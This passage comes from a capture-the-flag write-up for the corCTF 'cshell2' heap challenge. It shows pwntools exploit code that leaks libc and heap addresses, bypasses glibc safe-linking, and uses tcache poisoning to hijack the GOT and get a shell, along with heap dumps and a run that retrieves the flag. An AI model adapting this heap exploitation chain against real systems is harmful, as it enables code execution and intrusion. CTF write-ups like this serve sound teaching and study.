libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>u64(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1 Add</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1c7cc0</span>
pwn<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;libc: </span><span style="color:#e6db74">{</span>hex(libc<span style="color:#f92672">.</span>address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)

<span style="color:#75715e"># Heap state:</span>
<span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">0x1de1290	0x0000000000000000	0x0000000000000411	................ [chunk0]
</span><span style="color:#e6db74">0x1de12a0	0x68732f6e69622f0a	0x0000000000000a0a	./bin/sh........
</span><span style="color:#e6db74">0x1de12b0	0x000000000000000a	0x0000000000000539	........9.......
</span><span style="color:#e6db74">0x1de12c0	0x0000000000000000	0x0000000000000000	................
</span><span style="color:#e6db74">0x1de12d0	0x0000000000000000	0x0000000000000000	................
</span><span style="color:#e6db74">0x1de12e0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de12f0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1300	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1310	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1320	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1330	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1340	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1350	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1360	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1370	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1380	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1390	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de13a0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de13b0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de13c0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de13d0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de13e0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de13f0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1400	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1410	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1420	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1430	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1440	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1450	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1460	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1470	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1480	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1490	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de14a0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de14b0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de14c0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de14d0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de14e0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de14f0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1500	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1510	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1520	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1530	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1540	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1550	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1560	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1570	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1580	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1590	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de15a0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de15b0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de15c0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de15d0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de15e0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de15f0	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1600	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1610	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1620	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1630	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1640	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1650	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1660	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1670	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1680	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de1690	0x5959595959595959	0x5959595959595959	YYYYYYYYYYYYYYYY
</span><span style="color:#e6db74">0x1de16a0	0x5959595959595959	0x0a59595959595959	YYYYYYYYYYYYYYY.	 &lt;-- unsortedbin[all][0] [chunk1]
</span><span style="color:#e6db74">0x1de16b0	0x00007f34f64c3cc0	0x00007f34f64c3cc0	.&lt;L.4....&lt;L.4...
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</code></pre></div><p>Then let&rsquo;s get a heap leak, we request back from the tcache the 8-th chunk, we free the <code>9</code>-th chunk that is allocated right after the <code>8</code>-th to be able to leak its next free pointer same way as for the libc previously. Plus we have to defeat safe-linking. To understand the defeat of safe-linking I advice you to read <a href="https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation">this</a>. It ends up to the <code>decrypt_pointer</code> function that makes use of known parts of the encrypted <code>fp</code> to decrypt the whole pointer. I didn&rsquo;t code the function by myself, too lazy for that, code comes from the <a href="https://github.com/AeroCTF/aero-ctf-2022/blob/main/tasks/pwn/heap-2022/solution/sploit.py#L44">AeroCTF heap-2022 writeup</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt_pointer</span>(leak: int) <span style="color:#f92672">-&gt;</span> int:
    parts <span style="color:#f92672">=</span> []

    parts<span style="color:#f92672">.</span>append((leak <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">36</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">36</span>)
    parts<span style="color:#f92672">.</span>append((((leak <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFF</span>) <span style="color:#f92672">^</span> (parts[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">36</span>)) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">24</span>)
    parts<span style="color:#f92672">.</span>append((((leak <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">12</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFF</span>) <span style="color:#f92672">^</span> ((parts[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">24</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFF</span>)) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">12</span>)

    <span style="color:#66d9ef">return</span> parts[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">|</span> parts[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">|</span> parts[<span style="color:#ae81ff">2</span>]

add(<span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">1032</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#ae81ff">1337</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)

delete(<span style="color:#ae81ff">9</span>)
edit(<span style="color:#ae81ff">11</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#ae81ff">1337</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;X&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">1032</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>))

show(<span style="color:#ae81ff">11</span>)
io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;X&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">1032</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
heap <span style="color:#f92672">=</span> decrypt_pointer(pwn<span style="color:#f92672">.</span>u64(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1 Add</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1000</span>
pwn<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;heap: </span><span style="color:#e6db74">{</span>hex(heap)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)

<span style="color:#75715e"># Heap state</span>

<span style="color:#e6db74">&#34;&#34;&#34;
</span><span style="color:#e6db74">0x13f6310	0x0000000000000000	0x0000000000000411	................ [chunk8]
</span><span style="color:#e6db74">0x13f6320	0x00000000013f4c0a	0x000000000000000a	.L?.............
</span><span style="color:#e6db74">0x13f6330	0x000000000000000a	0x0000000000000539	........9.......
</span><span style="color:#e6db74">0x13f6340	0x0000000000000000	0x0000000000000000	................
</span><span style="color:#e6db74">0x13f6350	0x0000000000000000	0x0000000000000000	................
</span><span style="color:#e6db74">0x13f6360	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX [chun8-&gt;bio]
</span><span style="color:#e6db74">0x13f6370	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6380	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6390	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f63a0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f63b0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f63c0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f63d0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f63e0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f63f0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6400	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6410	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6420	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6430	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6440	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6450	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6460	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6470	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6480	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6490	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f64a0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f64b0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f64c0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f64d0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f64e0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f64f0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6500	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6510	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6520	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6530	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6540	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6550	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6560	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6570	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6580	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6590	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f65a0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f65b0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f65c0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f65d0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f65e0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f65f0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6600	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6610	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6620	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6630	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6640	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6650	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6660	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6670	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6680	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6690	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f66a0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f66b0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f66c0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f66d0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f66e0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f66f0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6700	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6710	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span style="color:#e6db74">0x13f6720	0x5858585858585858	0x0a58585858585858	XXXXXXXXXXXXXXX.
</span><span style="color:#e6db74">0x13f6730	0x00000000013f4ce6	0xdc8340f7dfc0b0e1	.L?..........@..	 &lt;-- tcachebins[0x410][0/7] [chunk9]
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>

</code></pre></div><p>Then here we are, we leaked both libc and heap base addresses. We just have to to tcache poisoning on <code>free</code>.</p>
<h2 id="tcache-poisoning--profit">Tcache poisoning + PROFIT</h2>
<p>We overflow the <code>8</code>-th chunk to overwrite the next freepointer of <code>chunk9</code> that is stored at the HEAD of the <code>0x410</code> tcachebin. Then we got an arbitrary write.
We craft a nice header to be able to request it back from the tcache, and we encrypt the <code>next</code> with the location of the <code>chunk9</code> to pass safe-linking checks.</p>
<p>Given we hiijack GOT we initialized properly some pointers around to avoid segfaults. We do not get a write into the GOT entry of <code>free</code> cause it is unaliagned and <code>malloc</code> needs <code>16</code> bytes aligned next free pointer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">edit(<span style="color:#ae81ff">11</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#ae81ff">1337</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;X&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">1032</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">64</span>) <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x411</span>) <span style="color:#f92672">+</span> pwn<span style="color:#f92672">.</span>p64(((heap <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2730</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">12</span>) <span style="color:#f92672">^</span> (exe<span style="color:#f92672">.</span>got<span style="color:#f92672">.</span>free <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x8</span>)))

<span style="color:#75715e"># dumb</span>
add(<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">1032</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#ae81ff">1337</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)

io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;5 re-age user</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str(<span style="color:#ae81ff">13</span>)<span style="color:#f92672">.</span>encode())
io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter size (1032 minimum): </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str(<span style="color:#ae81ff">1032</span>)<span style="color:#f92672">.</span>encode())
io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input firstname: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pwn<span style="color:#f92672">.</span>p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xbbdf80</span>))
io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input middlename: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pwn<span style="color:#f92672">.</span>p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system))
io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input lastname: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pwn<span style="color:#f92672">.</span>p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x71ab0</span>))
io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input age: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>encode())
io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Input bio: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pwn<span style="color:#f92672">.</span>p64(libc<span style="color:#f92672">.</span>address <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4cb40</span>))

<span style="color:#75715e"># Finally</span>

delete(<span style="color:#ae81ff">0</span>)
io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;cat flag.txt&#34;</span>)
pwn<span style="color:#f92672">.</span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;flag: </span><span style="color:#e6db74">{</span>io<span style="color:#f92672">.</span>recvline()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)

io<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>Here we are:</p>
<pre tabindex="0"><code>nasm@off:~/Documents/pwn/corCTF/cshell2$ python3 exploit.py REMOTE HOST=be.ax PORT=31667
[*] '/home/nasm/Documents/pwn/corCTF/cshell2/cshell2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fb000)
    RUNPATH:  b'.'
[*] '/home/nasm/Documents/pwn/corCTF/cshell2/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to be.ax on port 31667: Done
[*] libc: 0x7f1d388db000
[*] heap: 0x665000
[*] flag: b'corctf{m0nk3y1ng_0n_4_d3bugg3r_15_th3_b35T!!!}\n'
[*] Switching to interactive mode
$
</code></pre><h2 id="appendices">Appendices</h2>
<p>Final exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python</span>
<span style="color:#75715e"># -*- coding: utf-8 -*-</span>

<span style="color:#75715e"># this exploit was generated via</span>
<span style="color:#75715e"># 1) pwntools</span>
<span style="color:#75715e"># 2) ctfmate</span>

<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> time
<span style="color:#f92672">import</span> pwn


<span style="color:#75715e"># Set up pwntools for the correct architecture</span>
exe <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>ELF(<span style="color:#e6db74">&#39;cshell2&#39;</span>)
libc <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)

pwn<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>delete_corefiles <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
pwn<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>rename_corefiles <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
pwn<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>timeout <span style="color:#f92672">=</span> <span style="color:#ae81ff">2000</span>

host <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>HOST <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>
port <span style="color:#f92672">=</span> int(pwn<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>PORT <span style="color:#f92672">or</span> <span style="color:#ae81ff">1337</span>)


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">local</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
    <span style="color:#e6db74">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span style="color:#66d9ef">if</span> pwn<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>GDB:
        <span style="color:#66d9ef">return</span> pwn<span style="color:#f92672">.</span>gdb<span style="color:#f92672">.</span>debug([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, gdbscript<span style="color:#f92672">=</span>gdbscript, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
